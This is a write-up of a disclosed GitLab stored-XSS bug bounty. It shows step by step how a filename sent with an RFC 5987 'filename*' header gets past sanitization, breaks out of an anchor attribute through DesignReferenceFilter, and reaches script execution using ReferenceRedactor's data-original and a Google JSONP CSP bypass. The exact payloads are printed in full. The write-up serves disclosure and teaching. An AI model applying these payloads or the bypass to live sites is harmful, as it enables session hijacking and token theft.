---
title: "Stored XSS in markdown via the DesignReferenceFilter "
slug: "stored-xss-in-markdown-via-the-designreferencefilter"
platform: "hackerone"
vuln_class: "Cross-site Scripting (XSS) - Stored"
difficulty: "hard"
scope_type: "web"
bounty: 16000
program: "GitLab"
reporter: "vakzz"
published_at: "2021-10-18"
source_url: "https://hackerone.com/reports/1212067"
tags: []
teaser: "A markdown filter meant to enhance design references became the perfect hiding spot for persistent JavaScript payloads."
---

## The Program

GitLab is one of the most widely deployed DevOps platforms in the world, used by enterprises, open-source projects, and individual developers to manage source code, CI/CD pipelines, issue tracking, and collaborative workflows. The company runs one of the more mature and well-funded bug bounty programs on HackerOne, with a public scope that includes gitlab.com and its self-managed product. Critical vulnerabilities — particularly those affecting cross-tenant data or enabling account takeover — have historically received payouts in the $10,000–$20,000 range, reflecting both the platform's risk surface and the sensitivity of the data it holds.

The markdown rendering pipeline is a natural focus for security research on any collaborative platform. GitLab supports rich markdown across issues, merge requests, comments, wikis, and more — meaning any rendering flaw has a blast radius that spans the entire application. The Banzai rendering pipeline, GitLab's custom markdown processor, is composed of layered filters that each transform content in sequence. Because these filters interact in non-obvious ways, the composition of two individually-safe components can produce a dangerous result.

What made the Design Management feature particularly interesting was its combination of file uploads and markdown-rendered cross-references. Design files uploaded to issues are referenced in markdown by a specialized filter (`DesignReferenceFilter`) that generates anchor tags from structured URLs. The filename from the upload becomes part of that URL — and therefore part of the rendered HTML. This tight coupling between user-controlled file metadata and HTML generation made the attack surface worth probing carefully.

---

## The Recon

The starting point was the `DesignReferenceFilter`, part of GitLab's Banzai pipeline. Reading the source on GitLab's own public repository revealed that the filter parses design links using a `link_reference_pattern` defined in the `Design` model. The regex used to match filenames, `valid_char`, was defined as "any character that is not a forward slash or whitespace." This is a notably permissive definition — it explicitly permits double quotes, angle brackets, percent signs, and other HTML-sensitive characters.

The next question was whether a file with such characters in its filename could actually be uploaded. Standard uploads through GitLab's web interface route through Workhorse, a Go reverse proxy that pre-processes requests before they reach Rails. Workhorse passes files through `CarrierWave::SanitizedFile`, which strips or normalizes dangerous characters from filenames. This appeared to close the door — until examining how multipart form uploads could be constructed manually.

The key observation was that HTTP multipart forms support two encodings for the `filename` field in a `Content-Disposition` header: the simple `filename="foo.png"` form, and the RFC 5987 extended form `filename*=charset''encoded-value`. When a request uses `filename*=ASCII-8BIT''...`, the filename is decoded differently, and in this case Workhorse's sanitization logic did not apply the same normalization. This meant that by crafting a raw HTTP request with this header — easily done in Burp Suite's Repeater — arbitrary characters could be embedded in the filename that would end up stored in the database as-is.

With Burp Suite running as a proxy, the normal design upload flow was captured. The multipart request body showed the standard `Content-Disposition: form-data; name="1"; filename="image.png"` header. Modifying this to use the `filename*=ASCII-8BIT''` syntax with URL-encoded special characters bypassed the sanitization layer entirely.

---

## The "Wait a Second..." Moment

After uploading a design with a filename containing a double quote — achieved by setting `filename*=ASCII-8BIT''bbb%22class%3D%22gfm%22a%3D%27.png` — and then refreshing the GitLab issue page, the design appeared in the list with a name that contained literal quote and equals characters. The stored filename was `bbb"class="gfm"a='.png`. This confirmed that the database held unsanitized data.

The critical realization came from tracing how this filename feeds into the link-generation code in `AbstractReferenceFilter`. The relevant line was:

```ruby
link = %(<a href="#{url}" #{data} title="#{escape_once(title)}" class="#{klass}">#{content}</a>)
```

The `url` variable is interpolated directly into the HTML string without escaping. Since the URL contains the filename — which now contains a double quote — the quote terminates the `href` attribute mid-string. Everything after it is interpreted as additional HTML attributes or tag content. A stored filename containing `"` was sufficient to break out of the attribute context and inject arbitrary HTML attributes into the generated anchor tag.

---

## The Exploit

Exploitation required chaining two separate mechanisms: attribute injection via the malicious filename, and HTML replacement via the `ReferenceRedactor`'s `data-original` attribute handling.

**Step 1 — Upload the malicious design.**

In Burp Suite Repeater, capture or manually construct a design upload request to a GitLab issue. Modify the `Content-Disposition` header for the file part to:

```
Content-Disposition: form-data; name="1"; filename*=ASCII-8BIT''bbb%22class%3D%22gfm%22a%3D%27.png
```

The URL-encoded portion decodes to `bbb"class="gfm"a='.png`. Send the request. On refreshing the issue page, the design appears with the injected characters intact in its name.

**Step 2 — Confirm attribute injection.**

Create a new issue or comment containing a markdown link pointing to the malicious design URL:

```
<a href='https://gitlab.com/user/project/-/issues/2/designs/bbb%22class%3D%22gfm%22a%3D%27.png'>
' vakzz=here
</a>
```

Save and view the rendered output. Inspecting the DOM reveals that the generated anchor tag has been broken apart — the `href` terminates at the double quote in the filename, and additional attributes (`class="gfm"`, `a='`) have been injected into the tag. This confirms the injection point is live.

**Step 3 — Trigger the ReferenceRedactor for full HTML replacement.**

The `ReferenceRedactor` component replaces certain nodes with HTML taken from the `data-original` attribute, when the node also carries specific data attributes (`data-design`, `data-issue`, `data-reference-type`). By injecting these attributes and placing the XSS payload in `data-original`, the redactor substitutes the entire node with attacker-controlled HTML.

Create a new issue or comment with:

```
<a href='https://gitlab.com/user/project/-/issues/2/designs/bbb%22class%3D%22gfm%22a%3D%27.png'>
' data-design="1" data-issue="1" data-reference-type="design" data-original="
  &lt;script src='https://apis.google.com/complete/search?client=chrome&q=alert(document.domain);//&callback=setTimeout'>&lt;/script>
"
</a>
```

**Step 4 — CSP bypass via Google JSONP.**

GitLab enforces a Content Security Policy that blocks inline scripts and restricts `script-src`. However, `apis.google.com` was on the allowlist. The JSONP endpoint `https://apis.google.com/complete/search?client=chrome&q=alert(document.domain);//&callback=setTimeout` returns a response of the form `setTimeout(["alert(document.domain);//", ...])`, which executes `alert(document.domain)` as the callback. This bypassed the CSP entirely.

**Step 5 — Observe execution.**

Save the issue and reload the page. JavaScript executes in the victim's browser under the gitlab.com origin. The attack is stored — every user who views the issue triggers the payload without any further interaction.

---

## The Report

The report title should be precise and include the component name: "Stored XSS in markdown rendering via DesignReferenceFilter filename injection." This gives the triage team immediate context about both the vulnerability class and the affected subsystem.

Severity justification should connect the technical root cause to real-world impact. Stored XSS on a high-trust platform like GitLab is inherently severe because the payload executes for all viewers without social engineering — there is no need to convince a user to click a link. The CSP bypass element elevates this further: without it, XSS on a modern platform may be partially mitigated by browser protections. With a confirmed bypass (the Google JSONP technique), arbitrary JavaScript runs unconditionally. The CVSS score of 9.6 (Critical) reflects this: the attack requires no authentication to trigger for victims, and the impact includes full session compromise and API token exfiltration.

Reproduction steps should be broken into discrete actions and include the exact byte sequences used. The Burp Suite request modification — specifically the `filename*=ASCII-8BIT''` header — is non-obvious and must be spelled out explicitly. Each step should have a verifiable outcome: "after this step, the design appears with the injected characters visible in the UI." Triage teams reproduce reports under time pressure; ambiguity causes delays.

The impact statement should reference what an attacker can do post-exploitation, not just "XSS runs." In this case: exfiltration of personal access tokens (which have full API scope), impersonation of any user who views the affected page, potential for lateral movement across projects. Linking to related disclosures (as the reporter did, referencing report 1122227) helps establish precedent and demonstrates familiarity with the program's history.

---

## The Takeaway

The core insight is that sanitization applied at the transport layer (Workhorse) creates a false sense of security if the data model and rendering layer do not independently validate and escape the same data.

Similar bugs surface wherever a user-controlled string is stored in a database and later interpolated into an HTML template without escaping — the classic "trust on write, unsafe on read" pattern. To find analogues, focus on any system that stores metadata (filenames, labels, titles, slugs) derived from user input and then renders that metadata as part of generated HTML attributes. The most productive recon pattern is: find where user-supplied strings become HTML attribute values, then test whether the storage layer and the rendering layer apply sanitization independently or rely on each other.

Useful tools for this class of bug include Burp Suite's Repeater for crafting raw multipart uploads with non-standard `Content-Disposition` encodings, and browser DevTools for inspecting the rendered DOM to detect attribute injection before attempting script execution. Common variants include: title fields rendered into `title="..."` attributes, usernames or slugs embedded in `href="..."` values, and file labels used in dynamically-generated `<img>` or `<source>` tags. The CSP bypass component — leveraging allowlisted JSONP endpoints — is a separate but frequently applicable technique whenever XSS is found on a platform with a non-trivial CSP; a list of commonly allowlisted domains with exploitable JSONP endpoints is a valuable addition to any bounty hunter's toolkit.
